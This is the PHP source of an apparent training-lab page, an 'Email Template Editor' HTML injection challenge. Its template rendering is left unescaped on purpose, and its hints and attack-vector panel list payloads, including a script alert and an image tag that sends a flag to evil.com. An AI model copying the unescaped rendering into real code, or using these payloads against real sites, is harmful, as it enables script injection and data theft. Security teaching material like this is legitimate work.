<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['HTML-Injection']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['html_case4_attempts'])) {
  $_SESSION['html_case4_attempts'] = 0;
}
if (!isset($_SESSION['html_case4_solved'])) {
  $_SESSION['html_case4_solved'] = false;
}

// ─── Simulated Template Data ─────────────────────────────────────────────
$template_vars = [
  'username' => 'john_doe',
  'email' => 'john@darkhunter.local',
  'role' => 'Premium Member',
  'expiry_date' => '2026-12-31',
  'login_count' => 42,
  'flag' => 'DH{htmli_template_injection}',
];

$default_template = '<h1>Welcome {{username}}!</h1>
<p>Your account ({{email}}) is active until {{expiry_date}}.</p>
<p>Role: {{role}} | Logins: {{login_count}}</p>
<p>Thank you for being a valued member.</p>';

// ─── Vulnerable Template Rendering Logic ─────────────────────────────────
$rendered_output = '';
$template_injected = false;
$flag_triggered = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['render_template'])) {
  $template = $_POST['template'] ?? $default_template;

  // VULNERABLE: Template engine that doesn't escape HTML in variable output
  // Simulating a simple template engine that replaces {{var}} with values
  $rendered_output = $template;

  foreach ($template_vars as $key => $value) {
    $rendered_output = str_replace('{{' . $key . '}}', $value, $rendered_output);
  }

  // Check if user injected raw HTML into the template
  if (
    preg_match('/<[a-zA-Z][^>]*>/', $template) &&
    !preg_match('/\{\{[a-z_]+\}\}/', $template)
  ) {
    // User injected HTML directly into template
    $template_injected = true;
  }

  // Check for template injection that accesses the flag
  if (
    stripos($template, '{{flag}}') !== false ||
    stripos($template, 'flag') !== false && preg_match('/\{\{.*flag.*\}\}/i', $template)
  ) {
    $flag_triggered = true;
  }

  // Check for HTML tags in rendered output (bypass via variable or direct injection)
  if (preg_match('/<[a-zA-Z][^>]*>/', $rendered_output)) {
    $template_injected = true;
    if (preg_match('/<(h1|h2|script|iframe|form|div|span|a|img|marquee)\s*[^>]*>/i', $rendered_output)) {
      $flag_triggered = true;
    }
  }
}

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['html_case4_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['html_case4_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['html_case4_solved'] = true;
  $already_solved = true;
  $success_msg = "Excellent! You've successfully exploited a Template-based HTML Injection vulnerability. By injecting raw HTML into the email template, you bypassed the template engine's output encoding and controlled the rendered markup!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['render_template'])) {
  $_SESSION['html_case4_attempts']++;
}

$attempts = $_SESSION['html_case4_attempts'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Email Template Editor - HTML Injection Case 4 (Template)</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/HTML-CASE4.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to HTML Injection Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge medium"><i class="fas fa-bolt"></i> Medium Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-envelope-open-text"></i> Email Template Editor</h1>
      <p class="lab-description">Design and preview email templates for user notifications. This medium-difficulty HTML
        Injection challenge uses a server-side template engine. <strong>HTML in templates is rendered without
          escaping!</strong> Inject markup that bypasses template encoding.</p>
    </div>

    <?php if ($already_solved): ?>
      <div class="success-alert solved-banner">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Already Solved!</h3>
          <p>You have already exploited this Template HTML Injection vulnerability. You can continue exploring, but no
            additional points will be awarded.</p>
        </div>
      </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
      <div class="success-alert">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Completed!</h3>
          <p><?php echo $success_msg; ?></p>
        </div>
      </div>
    <?php endif; ?>

    <!-- Template Editor Grid -->
    <div class="editor-grid">

      <!-- Template Input -->
      <div class="editor-card input-card">
        <div class="card-header">
          <i class="fas fa-code"></i>
          <h3>Template Source</h3>
          <span class="vuln-badge"><i class="fas fa-unlock"></i> Raw HTML Allowed</span>
        </div>

        <form method="POST" action="" class="template-form" id="template-form">
          <input type="hidden" name="render_template" value="1">

          <div class="form-group">
            <label><i class="fas fa-file-code"></i> HTML Template</label>
            <textarea name="template" rows="12" class="form-textarea"
              placeholder="Enter your HTML template..."><?php echo isset($_POST['template']) ? htmlspecialchars($_POST['template']) : htmlspecialchars($default_template); ?></textarea>
          </div>

          <button type="submit" class="btn-render">
            <i class="fas fa-play"></i> Render Template
          </button>
        </form>

        <div class="variables-panel">
          <span class="variables-label">Available Variables:</span>
          <div class="variables-list">
            <?php foreach ($template_vars as $key => $value): ?>
              <code class="variable-tag">{<?php echo $key; ?>}</code>
            <?php endforeach; ?>
          </div>
        </div>
      </div>

      <!-- Rendered Preview -->
      <div class="editor-card preview-card">
        <div class="card-header">
          <i class="fas fa-eye"></i>
          <h3>Rendered Preview</h3>
          <span class="preview-badge">Live Output</span>
        </div>

        <?php if (!empty($rendered_output)): ?>
          <div class="preview-frame">
            <div class="preview-content">
              <?php echo $rendered_output; ?>
            </div>
          </div>

          <?php if ($template_injected): ?>
            <div class="injection-alert">
              <i class="fas fa-exclamation-triangle"></i>
              <span>HTML Injection detected in rendered output!</span>
            </div>
          <?php endif; ?>
        <?php else: ?>
          <div class="preview-empty">
            <i class="fas fa-eye-slash"></i>
            <p>Click "Render Template" to see the preview</p>
          </div>
        <?php endif; ?>
      </div>

      <!-- Raw Output -->
      <?php if (!empty($rendered_output)): ?>
        <div class="editor-card raw-card">
          <div class="card-header">
            <i class="fas fa-terminal"></i>
            <h3>Raw HTML Output</h3>
          </div>
          <div class="raw-output">
            <pre><code><?php echo htmlspecialchars($rendered_output); ?></code></pre>
          </div>
        </div>
      <?php endif; ?>

      <!-- Template Engine Info -->
      <div class="editor-card info-card">
        <div class="card-header">
          <i class="fas fa-info-circle"></i>
          <h3>Template Engine Behavior</h3>
        </div>
        <div class="info-content">
          <div class="info-item">
            <i class="fas fa-check-circle"></i>
            <div class="info-text">
              <strong>Variable Substitution</strong>
              <span>{{variable}} is replaced with the value</span>
            </div>
          </div>
          <div class="info-item vuln">
            <i class="fas fa-times-circle"></i>
            <div class="info-text">
              <strong>No HTML Escaping</strong>
              <span>Values are inserted as raw HTML</span>
            </div>
          </div>
          <div class="info-item vuln">
            <i class="fas fa-times-circle"></i>
            <div class="info-text">
              <strong>Direct HTML in Template</strong>
              <span>Any HTML in the template body is preserved</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Attack Vectors -->
      <div class="editor-card vectors-card">
        <div class="card-header">
          <i class="fas fa-skull-crossbones"></i>
          <h3>Template Injection Vectors</h3>
        </div>
        <div class="vectors-list">
          <div class="vector-item">
            <div class="vector-name">Variable-based Injection</div>
            <code class="vector-code">{{username}}&lt;script&gt;alert(1)&lt;/script&gt;</code>
            <span class="vector-desc">If username contains HTML, it's rendered raw</span>
          </div>
          <div class="vector-item">
            <div class="vector-name">Template Body Injection</div>
            <code class="vector-code">&lt;h1&gt;Hacked!&lt;/h1&gt;{{username}}</code>
            <span class="vector-desc">Direct HTML in template is rendered</span>
          </div>
          <div class="vector-item">
            <div class="vector-name">Data Exfiltration</div>
            <code class="vector-code">&lt;img src="https://evil.com?data={{flag}}"&gt;</code>
            <span class="vector-desc">Access hidden template variables</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Current Request</span>
      </div>
      <div class="debug-body">
        <code><?php echo $_SERVER['REQUEST_METHOD']; ?> <?php echo $_SERVER['REQUEST_URI']; ?></code>
        <div class="request-details">
          <span>Template Rendered: <?php echo !empty($rendered_output) ? 'YES' : 'NO'; ?></span>
          <span>HTML Injected: <?php echo $template_injected ? 'YES' : 'NO'; ?></span>
          <span>Flag Accessed: <?php echo $flag_triggered ? 'YES' : 'NO'; ?></span>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
        <div class="hint-text">The template engine replaces <code>{{variable}}</code> with raw values without escaping.
          Try typing HTML tags directly in the template body, like <code>&lt;h1&gt;Test&lt;/h1&gt;</code>, and see if they
          render.</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
        <div class="hint-text">Look at the available variables. There's a hidden <code>{{flag}}</code> variable! Try to
          access it by including it in your template. Also, you can inject HTML that references variables to exfiltrate
          data.</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
      <div class="hint-box hint-final">
        <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
        <div class="hint-text">Use this template to access the flag: <code>&lt;h1&gt;Flag: {{flag}}&lt;/h1&gt;</code>. Or
          inject HTML directly:
          <code>&lt;div style="background:red;padding:20px"&gt;&lt;h1&gt;PWNED&lt;/h1&gt;&lt;/div&gt;</code>. The template
          engine renders all HTML without escaping!
        </div>
      </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
    window.addEventListener('load', function() {
      const injectionAlert = document.querySelector('.injection-alert');
      const alreadySolved = document.querySelector('.solved-banner');

      if (injectionAlert && !alreadySolved) {
        document.getElementById('solved-flag').value = '1';
        document.getElementById('success-form').submit();
      }
    });
  </script>
</body>

</html>